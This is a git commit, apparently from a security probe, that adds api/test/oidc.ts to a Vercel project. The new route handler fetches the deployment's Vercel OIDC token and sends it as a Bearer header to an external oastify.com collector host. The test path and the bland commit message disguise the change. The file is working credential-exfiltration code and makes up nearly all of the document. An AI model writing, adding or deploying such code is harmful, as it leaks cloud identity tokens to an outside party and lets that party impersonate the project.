a58723af40b36ffb7f315cacfbc6be268131562c
Security testing <118594933+w2h3@users.noreply.github.com>
2024-07-11 13:07:25 +0300

    Create oidc.ts

---
+++ api/test/oidc.ts
@@ -0,0 +1,11 @@
+import { getVercelOidcToken } from '@vercel/functions/oidc';
+ 
+export const GET = async () => {
+  const result = await fetch('https://tolvz876nrzdz3x0lu3qdntad1js7j3br0.oastify.com', {
+    headers: {
+      Authorization: `Bearer ${await getVercelOidcToken()}`,
+    },
+  });
+ 
+  return Response.json(await result.json());
+};
